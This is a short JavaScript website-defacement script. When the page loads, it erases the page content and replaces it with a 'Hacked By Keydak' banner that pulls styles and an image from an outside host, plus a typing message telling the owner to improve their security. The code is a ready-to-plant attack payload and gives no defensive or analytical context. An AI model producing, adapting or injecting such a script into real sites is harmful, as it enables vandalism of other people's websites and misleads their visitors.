// Deface script
document.addEventListener('DOMContentLoaded', function () {

    document.documentElement.innerHTML = '';


    var newHtmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Home - Hacked By Keydak</title>
            <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
        </head>
        <body>
            <div class="mainContainer">
                <div class="img">
                    <img class="mainImage" src="https://kepo-six.vercel.app/jett.png" alt="image" style="width: 400px;">
                </div>
                <h1> Hacked By Keydak</h1>
                <hr class="hr">
                <div class="container">
                    <p class="text1"></p>
                </div>
            </div>
        </body>
              <script>
                             
                function startTypingAnimation() {
                    var textElement = document.querySelector('.text1');
                    var text = "you need to improve the security system on your site";
                    var index = 0;

                    function type() {
                        if (index < text.length) {
                            textElement.textContent += text.charAt(index);
                            index++;
                            setTimeout(type, 150);
                        } else {
                            setTimeout(() => {
                                 textElement.textContent -= text.charAt(index);
                            index--;
                            setTimeout(type, 150);
                                textElement.textContent = '';
                                setTimeout(() => {
                                    textElement.style.opacity = 1;
                                    type();
                                }, 1000);
                            }, 1000);
                        }
                    }

                    type(); 
                }

                startTypingAnimation(); 

            </script>
        </html>
    `;


    // document.addEventListener('DOMContentLoaded', function() {
    //     var text = "you need to improve the security system on your site";
    //     var textElement = document.querySelector('.text1');
    //     var index = 0;

    //     function type() {
    //         if (index < text.length) {
    //             textElement.textContent += text.charAt(index);
    //             index++;
    //             setTimeout(type, 150);
    //         }
    //     }

    //     type();
    // });
   var fragment = document.createRange().createContextualFragment(newHtmlContent);
    document.body.appendChild(fragment);
});